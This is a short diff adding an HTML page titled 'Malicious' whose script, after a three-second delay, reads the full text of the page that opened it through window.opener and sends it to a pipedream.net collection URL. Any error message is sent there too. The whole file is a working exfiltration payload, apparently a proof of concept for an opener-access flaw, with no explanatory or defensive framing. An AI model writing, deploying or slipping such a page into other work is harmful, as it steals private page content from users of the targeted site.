@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta charset="UTF-8"><title>Malicious</title></head>
+<body>
+<script>
+  // Attends que la page opener soit prête
+  setTimeout(() => {
+    try {
+      const secret = window.opener.document.body.innerText;
+      fetch('https://eosaujiilwrrffu.m.pipedream.net?secret=' + encodeURIComponent(secret));
+    } catch(e) {
+      fetch('https://eosaujiilwrrffu.m.pipedream.net?error=' + encodeURIComponent(e.message));
+    }
+  }, 3000);
+</script>
+</body>
+</html>
